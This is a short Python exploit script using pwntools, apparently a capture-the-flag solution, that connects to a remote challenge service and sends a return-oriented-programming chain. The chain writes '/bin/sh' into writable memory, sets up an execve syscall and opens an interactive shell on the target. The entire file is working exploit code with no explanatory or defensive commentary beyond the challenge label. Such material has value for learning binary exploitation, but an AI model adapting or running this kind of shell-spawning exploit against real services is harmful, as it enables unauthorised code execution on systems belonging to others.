import argparse

from pwn import *

# context.log_level = 'debug'

parser = argparse.ArgumentParser()
parser.add_argument("address", default="127.0.0.1:8000", help="Address of challenge")


args = parser.parse_args()

HOST, PORT = args.address.split(':')

r = remote(HOST, int(PORT))

chain = [
    0x00401181, # pop rcx ; retn
    0x68732F6E69622F, # /bin/sh\x00
    0x0040117d, # pop rax ; retn
    0x00403380, # writable data
    0x00401229, # mov qword [rax], rcx ; retn
    0x0040117d, # pop rax ; retn
    59,
    0x00401187, # pop rdi ; retn
    0x00403380,
    0x00401185, # pop rsi ; retn
    0,
    0x00401183, # pop rdx ; retn
    0,
    0x0040122d, # syscall
]

chain = [
    0x0040101a, # retn
] * 40 + chain

r.sendline(b''.join(p64(a) for a in chain))
r.interactive()